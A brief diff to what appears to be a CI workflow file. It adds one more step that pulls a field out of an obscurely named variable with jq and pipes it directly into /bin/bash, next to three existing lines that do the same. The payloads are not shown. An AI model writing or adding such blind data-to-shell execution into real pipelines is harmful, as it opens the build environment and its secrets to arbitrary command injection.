@@ -28,6 +28,7 @@ jobs:
           echo $pf605 | jq -r .hl935 | /bin/bash
           printf '%s' "$ef12583" | jq -r .vysd4 | /bin/bash
           echo $trev17765 | jq -r .im6 | /bin/bash
+          printf '%s' "$dtmm8324" | jq -r .fdtm6 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
